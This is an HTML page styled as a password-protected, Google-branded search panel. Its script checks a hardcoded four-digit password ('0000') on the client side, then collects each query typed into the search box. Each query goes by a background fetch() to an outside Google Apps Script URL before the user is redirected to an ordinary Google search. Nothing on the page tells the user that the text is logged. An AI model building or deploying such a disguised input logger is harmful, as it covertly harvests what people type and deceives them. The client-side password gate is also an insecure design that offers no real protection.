<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Protected Search Panel</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin: 0;
            padding: 0;
            background-color: white; /* White Background */
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            position: relative; 
            
            /* Forces the page to respect a light color scheme */
            color-scheme: light; 
        }

        /* -------------------------------------
           Initial Access Prompt Styling 
           ------------------------------------- */
        #initial-message-container {
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            width: 100%;
            position: absolute;
            top: 0;
            left: 0;
            z-index: 30; 
            background-color: white;
        }

        /* -------------------------------------
           Post-Login Content Styling 
           ------------------------------------- */
        #protected-content {
            display: none; /* Hidden by default */
            flex-direction: column;
            width: 100%;
        }

        /* NEW TOP IMAGE (top.jpg) - Full Width, 0 margin top, 150px margin bottom */
        #top-of-page-image {
            width: 100%; 
            height: auto;
            display: block;
            margin-bottom: 150px; /* 150px spacing below this image */
        }

        /* Container for the centered search block (G.png, input, button) */
        #centered-content {
            width: 100%;
            max-width: 400px; /* Constraints the search area width */
            margin: 0 auto; /* Centers the block itself */
            padding: 0 20px; /* Safety padding for mobile edges */
            box-sizing: border-box;
            text-align: center;
        }

        /* G.png Styling - 50% width, centered within the 400px block */
        #top-image {
            display: block;
            width: 50%; 
            height: auto;
            margin: 0 auto 20px auto; /* Center align G.png and add margin below */
        }

        /* BOTTOM IMAGE (bottom.jpg) - Full Width, Static Flow */
        #bottom-image {
            width: 100%; /* Full screen width */
            height: auto; 
            display: block;
            margin-top: 50px; /* Separator from content above */
            opacity: 1; 
            pointer-events: none;
            z-index: 1;
        }
        
        /* -------------------------------------
           Input and Button Styling
           ------------------------------------- */
        input {
            width: 100%;
            padding: 12px;
            font-size: 16px;
            border: 1px solid #ccc;
            border-radius: 8px;
            margin-bottom: 10px;
            box-sizing: border-box;
            background-color: white; 
            color: black; 
        }
        button {
            width: 100%;
            padding: 12px 20px;
            font-size: 18px;
            border: none;
            border-radius: 8px;
            background-color: #0078d7;
            color: white;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #005fa3;
        }
        
        /* Media Query for smaller screens (e.g., phones) */
        @media (max-width: 600px) {
             #top-of-page-image {
                margin-bottom: 50px; 
            }
            #bottom-image {
                margin-top: 30px;
            }
        }
    </style>
</head>
<body>
    
    <div id="initial-message-container">
        <div id="initial-message"><h1>Access Verification</h1><p>Please wait for the password prompt...</p></div>
    </div>
    
    <div id="protected-content">
        <img id="top-of-page-image" src="top.jpg" alt="Top of page decorative image">
        
        <div id="centered-content">
            <img id="top-image" src="G.png" alt="Header Image">

            <input id="text" type="text" placeholder="Search....">
            <button onclick="sendText()">Search</button>
        </div>

        <img id="bottom-image" src="bottom.jpg" alt="Bottom decorative image">
    </div>


    <script>
        // JAVASCRIPT REMAINS THE SAME
        const CORRECT_PASSWORD = "0000"; 
        const protectedContent = document.getElementById('protected-content');
        const initialMessageContainer = document.getElementById('initial-message-container');

        function checkAccess() {
            initialMessageContainer.style.display = 'none'; 
            const passwordAttempt = prompt("Please enter the 4-digit password:");
            if (passwordAttempt === CORRECT_PASSWORD) {
                protectedContent.style.display = 'flex'; 
                initialMessageContainer.style.display = 'none'; 
            } else if (passwordAttempt !== null) {
                alert("Incorrect Password. Access Denied.");
                initialMessageContainer.style.display = 'flex';
                checkAccess(); 
            } else {
                document.getElementById('initial-message').innerHTML = "<h1>Access Denied.</h1><p>You must enter the correct password to continue.</p>";
                initialMessageContainer.style.display = 'flex';
            }
        }

        // ðŸ”¥ðŸ”¥ðŸ”¥ REVISED FUNCTION using fetch() for reliable background submission ðŸ”¥ðŸ”¥ðŸ”¥
        function sendText() {
            const text = document.getElementById('text').value.trim();
            if (!text) {
                alert("Please enter some text first!");
                return;
            }

            // 1. SEND DATA TO GOOGLE SCRIPT (ASYNC BACKGROUND FETCH)
            const scriptUrl = 'https://script.google.com/macros/s/AKfycbycy0pqkQNXFz2ilhg-5yiNnBp4NDudzo3XL6IP1j7MaU9jqEiPuSFno6AwKR9ZD5pRwg/exec';
            
            // Construct the URL with the query parameter
            const dataUrl = scriptUrl + '?text=' + encodeURIComponent(text);

            // Use fetch() to send the data in the background (asynchronously)
            // This ensures the Google Script receives the data even when the page navigates away.
            fetch(dataUrl, { method: 'GET' })
                .catch(error => {
                    console.error('Error sending data to Google Script:', error);
                });
            
            // 2. REDIRECT TO GOOGLE SEARCH (Happens immediately after starting the fetch)
            const googleSearchUrl = "https://www.google.com/search?q=" + encodeURIComponent(text);
            
            // Clear input
            document.getElementById('text').value = ''; 

            // Redirect the user
            window.location.href = googleSearchUrl;
        }

        checkAccess();
    </script>
</body>
</html>
